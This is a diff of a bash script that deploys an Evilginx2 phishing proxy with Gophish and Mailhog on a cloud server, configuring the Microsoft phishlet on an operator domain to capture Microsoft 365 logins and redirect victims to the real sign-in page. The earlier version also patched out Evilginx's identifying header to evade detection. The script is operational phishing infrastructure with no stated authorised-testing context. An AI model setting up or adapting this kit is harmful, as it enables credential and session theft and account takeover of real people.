@@ -1,5 +1,5 @@
 #!/bin/bash
-# ==== Evilginx3 + Gophish + Mailhog Setup Script (Ubuntu 20.04, Vultr) ====
+# ==== Evilginx2 v3.3.0 + Gophish + Mailhog Setup Script (Ubuntu 20.04, Vultr) ====
 
 set -e
 
@@ -14,42 +14,43 @@ GOPHISH_PASS="$(openssl rand -hex 12)"
 
 # ==== Update & Install Base Packages ====
 apt update && apt upgrade -y
-apt install -y git make curl unzip ufw build-essential ca-certificates gnupg lsb-release
+apt install -y git make curl unzip ufw build-essential ca-certificates gnupg lsb-release libcap2-bin
 
 # ==== Install Go 1.22.3 ====
 GO_VERSION="1.22.3"
 cd /tmp
 curl -LO https://go.dev/dl/go$GO_VERSION.linux-amd64.tar.gz
 rm -rf /usr/local/go && tar -C /usr/local -xzf go$GO_VERSION.linux-amd64.tar.gz
+
+# Add Go to PATH permanently
+echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/go.sh
+chmod +x /etc/profile.d/go.sh
 export PATH=$PATH:/usr/local/go/bin
 
-# ==== Install Evilginx3 ====
+# ==== Install Evilginx2 v3.3.0 ====
 cd /opt
-git clone https://github.com/SygniaLabs/evilginx3.git
-cd evilginx3
-make
-setcap cap_net_bind_service=+ep ./bin/evilginx
+git clone --branch v3.3.0 https://github.com/kgretzky/evilginx2.git
+cd evilginx2
+make build
+setcap cap_net_bind_service=+ep /opt/evilginx2/dist/evilginx
 
-# ==== Evilginx SSL Config ====
-cat <<EOF > /root/evilginx3_autosetup.txt
+# ==== Evilginx2 Auto Config ====
+cat <<EOF > /root/evilginx2_autosetup.txt
 config domain $DOMAIN
 config ip $(curl -s ifconfig.me)
 config redirect_url https://login.microsoftonline.com/
-config enable_ssl true
+config autocert on
 phishlets hostname microsoft $DOMAIN
 phishlets enable microsoft
 EOF
-
-# ==== Disable X-Evilginx Header ====
-sed -i 's/"X-Evilginx"/"X-"/' core/http_proxy.go || true
 
 # ==== Install Gophish ====
 cd /opt
 curl -LO https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
 unzip gophish-v0.12.1-linux-64bit.zip -d gophish
 cd gophish
-sed -i "s/"admin_server":.*/"admin_server": \"0.0.0.0:$GOPHISH_PORT\",/" config.json
-sed -i "s/"use_tls": true/"use_tls": false/" config.json
+sed -i "s/\"admin_server\":.*/\"admin_server\": \"0.0.0.0:$GOPHISH_PORT\",/" config.json
+sed -i "s/\"use_tls\": true/\"use_tls\": false/" config.json
 
 # ==== Store Gophish Credentials ====
 echo -e "Gophish Login:\nUser: $GOPHISH_USER\nPass: $GOPHISH_PASS" > /root/gophish-credentials.txt
@@ -101,11 +102,11 @@ systemctl daemon-reload
 systemctl enable --now gophish mailhog
 
 # ==== Done ====
-echo "\nSetup Complete!"
-echo "Evilginx path: /opt/evilginx3/bin/evilginx"
-echo "Run it manually: /opt/evilginx3/bin/evilginx"
-echo "Auto setup commands in: /root/evilginx3_autosetup.txt"
+echo "\n Setup Complete!"
+echo "Evilginx path: /opt/evilginx2/dist/evilginx"
+echo "Run it manually: /opt/evilginx2/dist/evilginx"
+echo "Auto setup commands in: /root/evilginx2_autosetup.txt"
 echo "Gophish UI: http://$(curl -s ifconfig.me):$GOPHISH_PORT"
 echo "Mailhog UI: http://$(curl -s ifconfig.me):$MAILHOG_PORT"
 echo "Gophish credentials saved in /root/gophish-credentials.txt"
-echo "Remember to run Evilginx interactively to load phishlets."
+echo " Remember to run Evilginx interactively to load phishlets."
